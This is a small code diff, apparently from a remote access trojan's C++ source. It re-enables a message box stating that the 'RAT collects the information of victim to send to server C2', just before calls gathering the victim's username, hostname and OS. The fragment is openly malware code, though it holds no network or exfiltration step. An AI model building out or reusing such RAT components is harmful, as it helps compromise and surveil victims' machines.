@@ -193,7 +193,7 @@ void SystemInfo::GetDisk(WCHAR* disk) {
 }
 
 void SystemInfo::GetSystemDetails(SystemDetails* details) {
-	//MessageBox(NULL, L"RAT collects the information of victim to send to server C2!", L"Flow", MB_OK);
+	MessageBox(NULL, L"RAT collects the information of victim to send to server C2!", L"Flow", MB_OK);
 	GetUsername(details->username);
 	GetHostname(details->hostname);
 	GetOS(details->os);
